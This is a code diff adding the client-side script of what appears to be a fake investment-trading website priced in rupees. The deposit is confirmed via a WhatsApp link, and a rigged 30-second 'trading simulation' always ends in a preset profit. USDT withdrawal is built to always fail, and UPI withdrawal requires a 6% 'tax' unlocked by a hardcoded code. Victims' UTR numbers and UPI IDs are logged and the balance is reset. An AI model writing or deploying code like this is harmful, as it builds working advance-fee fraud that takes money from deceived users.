+                    document.getElementById('depositAmount').value = `₹${currentPlanAmount}`;
+                });
+            });
+            
+            // Verify button (WhatsApp)
+            verifyBtn.addEventListener('click', function() {
+                const utrNumber = document.getElementById('utrNumber').value;
+                
+                if (!utrNumber) {
+                    alert('Please enter UTR number');
+                    return;
+                }
+                
+                // Generate redeem code (first 2 digits of mobile + amount + "claim")
+                const mobileNumber = mobileNumberInput.value;
+                redeemCode = `${mobileNumber.slice(0, 2)}${currentPlanAmount}claim`;
+                
+                // Deposit activity track karein
+                logUserActivity(userId, "deposit_initiated", {
+                    amount: currentPlanAmount,
+                    utr: utrNumber
+                });
+                
+                // Show message about contacting WhatsApp
+                alert('Please contact support via WhatsApp for payment verification. You will receive a redeem code there.');
+                
+                // Open WhatsApp link
+                window.open('https://wa.link/nz2wrh', '_blank');
+                
+                // Show redeem section
+                redeemSection.style.display = 'block';
+                verifyBtn.style.display = 'none';
+            });
+            
+            // Redeem button
+            redeemBtn.addEventListener('click', function() {
+                const enteredRedeemCode = redeemCodeInput.value;
+                
+                if (enteredRedeemCode !== redeemCode) {
+                    // Failed redemption attempt track karein
+                    logUserActivity(userId, "redeem_failed", {
+                        reason: "invalid_code",
+                        enteredCode: enteredRedeemCode
+                    });
+                    alert('Invalid redeem code. Please check the code you received on WhatsApp.');
+                    return;
+                }
+                
+                // Successful deposit track karein
+                logUserActivity(userId, "deposit_success", {
+                    amount: currentPlanAmount,
+                    utr: document.getElementById('utrNumber').value
+                });
+                
+                // After verification, show trading page with updated balance
+                showPage('trading-page');
+                userBalance += currentPlanAmount;
+                document.getElementById('userBalance').textContent = userBalance;
+                
+                // Set investment amount and expected profit
+                document.getElementById('investmentAmount').value = currentPlanAmount;
+                document.getElementById('expectedProfit').value = currentPlanProfit;
+                
+                alert('Deposit successful! You can now start trading.');
+            });
+            
+            // Trade button
+            tradeBtn.addEventListener('click', function() {
+                // Trading start track karein
+                logUserActivity(userId, "trading_started", {
+                    amount: currentPlanAmount,
+                    expectedProfit: currentPlanProfit
+                });
+                
+                // Show trading animation page
+                showPage('trading-animation-page');
+                
+                // Start the trading simulation
+                startTradingSimulation();
+            });
+            
+            // Trading simulation function
+            function startTradingSimulation() {
+                const duration = 30; // 30 seconds
+                let timeRemaining = duration;
+                let currentValue = currentPlanAmount;
+                const targetValue = currentPlanAmount + currentPlanProfit;
+                
+                // Initialize graph
+                initializeGraph();
+                
+                // Update function
+                tradingInterval = setInterval(function() {
+                    timeRemaining--;
+                    
+                    // Update countdown timer
+                    countdownTimer.textContent = `${timeRemaining}s`;
+                    
+                    // Update progress bar
+                    const progress = ((duration - timeRemaining) / duration) * 100;
+                    progressBar.style.width = `${progress}%`;
+                    
+                    // Update time left
+                    timeLeft.textContent = `${timeRemaining}s`;
+                    
+                    // Simulate price movement (realistic fluctuations)
+                    const fluctuation = (Math.random() * 10 - 5) * (1 - progress/100);
+                    currentValue += (targetValue - currentValue) * 0.05 + fluctuation;
+                    
+                    // Ensure we don't go below initial investment
+                    if (currentValue < currentPlanAmount * 0.8) {
+                        currentValue = currentPlanAmount * 0.8;
+                    }
+                    
+                    // Update current amount display
+                    currentAmount.textContent = `₹${Math.round(currentValue)}`;
+                    
+                    // Calculate and display profit/loss
+                    const profitPercent = ((currentValue - currentPlanAmount) / currentPlanAmount) * 100;
+                    if (profitPercent >= 0) {
+                        profitLoss.textContent = `+${profitPercent.toFixed(2)}%`;
+                        profitLoss.className = 'stat-value profit';
+                    } else {
+                        profitLoss.textContent = `${profitPercent.toFixed(2)}%`;
+                        profitLoss.className = 'stat-value loss';
+                    }
+                    
+                    // Update graph
+                    updateGraph(progress, currentValue, currentPlanAmount, targetValue);
+                    
+                    // Check if simulation is complete
+                    if (timeRemaining <= 0) {
+                        clearInterval(tradingInterval);
+                        
+                        // Final update to show exact profit
+                        currentValue = targetValue;
+                        currentAmount.textContent = `₹${currentValue}`;
+                        profitLoss.textContent = `+${((currentPlanProfit / currentPlanAmount) * 100).toFixed(2)}%`;
+                        profitLoss.className = 'stat-value profit';
+                        
+                        // Update graph to final state
+                        updateGraph(100, currentValue, currentPlanAmount, targetValue);
+                        
+                        // Trading success track karein
+                        logUserActivity(userId, "trading_success", {
+                            invested: currentPlanAmount,
+                            profit: currentPlanProfit,
+                            finalBalance: userBalance + currentPlanProfit
+                        });
+                        
+                        // Wait a moment then show success and move to withdrawal page
+                        setTimeout(function() {
+                            userBalance += currentPlanProfit;
+                            document.getElementById('userBalance').textContent = userBalance;
+                            
+                            // Set withdrawal amount
+                            document.getElementById('withdrawAmount').value = userBalance;
+                            document.getElementById('usdtAmount').value = userBalance;
+                            
+                            // Calculate tax amount (6%)
+                            const taxAmount = Math.round(userBalance * 0.06);
+                            document.getElementById('taxAmount').value = `₹${taxAmount}`;
+                            
+                            // Show withdrawal page
+                            showPage('withdrawal-page');
+                            
+                            alert(`Trade successful! ₹${currentPlanProfit} profit has been added to your account.`);
+                        }, 2000);
+                    }
+                }, 1000);
+            }
+            
+            // Initialize graph
+            function initializeGraph() {
+                // Clear previous graph
+                graphPath.innerHTML = '';
+                
+                // Create initial flat line
+                const initialPath = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+                initialPath.setAttribute('d', 'M0,50 L100,50');
+                initialPath.setAttribute('stroke', '#4cc2ff');
+                initialPath.setAttribute('stroke-width', '2');
+                initialPath.setAttribute('fill', 'none');
+                graphPath.appendChild(initialPath);
+                
+                // Set initial graph fill height
+                graphFill.style.height = '50%';
+            }
+            
+            // Update graph with new data
+            function updateGraph(progress, currentValue, initialValue, targetValue) {
+                // Clear previous graph
+                graphPath.innerHTML = '';
+                
+                // Calculate the number of points based on progress
+                const pointCount = 20;
+                const points = [];
+                
+                // Generate points with realistic fluctuations
+                for (let i = 0; i < pointCount; i++) {
+                    const x = (i / (pointCount - 1)) * 100;
+                    
+                    // Base value increases over time
+                    const baseValue = 50 - (progress / 100) * 40;
+                    
+                    // Add realistic fluctuations
+                    const fluctuation = (Math.random() * 10 - 5) * (1 - (i / pointCount));
+                    
+                    // Calculate y value (inverted for SVG coordinate system)
+                    const y = Math.max(10, Math.min(90, baseValue + fluctuation));
+                    
+                    points.push({ x, y });
+                }
+                
+                // Create SVG path
+                let pathData = `M${points[0].x},${points[0].y} `;
+                for (let i = 1; i < points.length; i++) {
+                    pathData += `L${points[i].x},${points[i].y} `;
+                }
+                
+                const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+                path.setAttribute('d', pathData);
+                path.setAttribute('stroke', '#4cc2ff');
+                path.setAttribute('stroke-width', '2');
+                path.setAttribute('fill', 'none');
+                graphPath.appendChild(path);
+                
+                // Create filled area under the curve
+                const fillPathData = `${pathData} L100,100 L0,100 Z`;
+                const fillPath = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+                fillPath.setAttribute('d', fillPathData);
+                fillPath.setAttribute('fill', 'url(#graphGradient)');
+                fillPath.setAttribute('opacity', '0.3');
+                graphPath.appendChild(fillPath);
+                
+                // Create gradient for fill
+                const defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
+                const gradient = document.createElementNS('http://www.w3.org/2000/svg', 'linearGradient');
+                gradient.setAttribute('id', 'graphGradient');
+                gradient.setAttribute('x1', '0%');
+                gradient.setAttribute('y1', '0%');
+                gradient.setAttribute('x2', '0%');
+                gradient.setAttribute('y2', '100%');
+                
+                const stop1 = document.createElementNS('http://www.w3.org/2000/svg', 'stop');
+                stop1.setAttribute('offset', '0%');
+                stop1.setAttribute('stop-color', '#4cc2ff');
+                
+                const stop2 = document.createElementNS('http://www.w3.org/2000/svg', 'stop');
+                stop2.setAttribute('offset', '100%');
+                stop2.setAttribute('stop-color', '#1a1f4b');
+                
+                gradient.appendChild(stop1);
+                gradient.appendChild(stop2);
+                defs.appendChild(gradient);
+                graphPath.appendChild(defs);
+            }
+            
+            // Withdraw UPI button
+            withdrawUpiBtn.addEventListener('click', function() {
+                const upiId = document.getElementById('upiId').value;
+                
+                if (!upiId) {
+                    alert('Please enter your UPI ID');
+                    return;
+                }
+                
+                // Withdrawal request save karein
+                saveWithdrawalRequest(userId, "upi", userBalance, {
+                    upiId: upiId
+                });
+                
+                // Show tax section
+                taxSection.style.display = 'block';
+            });
+            
+            // Withdraw USDT button (always shows error)
+            withdrawUsdtBtn.addEventListener('click', function() {
+                const usdtAddress = document.getElementById('usdtAddress').value;
+                
+                if (!usdtAddress) {
+                    alert('Please enter your USDT address');
+                    return;
+                }
+                
+                // USDT withdrawal attempt track karein
+                logUserActivity(userId, "withdrawal_failed", {
+                    method: "usdt",
+                    reason: "temporarily_unavailable"
+                });
+                
+                alert('Error: USDT withdrawal is temporarily unavailable. Please use UPI withdrawal.');
+            });
+            
+            // Pay tax button
+            payTaxBtn.addEventListener('click', function() {
+                const taxId = document.getElementById('taxId').value;
+                
+                if (!taxId) {
+                    alert('Please enter Tax ID');
+                    return;
+                }
+                
+                if (taxId !== 'mytaxdone11') {
+                    // Failed tax payment track karein
+                    logUserActivity(userId, "tax_payment_failed", {
+                        reason: "invalid_tax_id",
+                        enteredTaxId: taxId
+                    });
+                    alert('Invalid Tax ID. Please contact support via WhatsApp to get your Tax ID.');
+                    return;
+                }
+                
+                // Successful tax payment track karein
+                logUserActivity(userId, "tax_payment_success", {
+                    amount: Math.round(userBalance * 0.06),
+                    taxId: taxId
+                });
+                
+                // Successful withdrawal track karein
+                saveWithdrawalRequest(userId, "upi", userBalance, {
+                    status: "processed",
+                    upiId: document.getElementById('upiId').value,
+                    taxPaid: Math.round(userBalance * 0.06)
+                });
+                
+                alert('Tax payment successful! Your withdrawal will be processed within 24 hours.');
+                
+                // Reset everything and go back to login
+                showPage('login-page');
+                taxSection.style.display = 'none';
+                userBalance = 0;
+                logoutBtn.style.display = 'none';
+            });
+        });
+    </script>
+</body>
+</html>
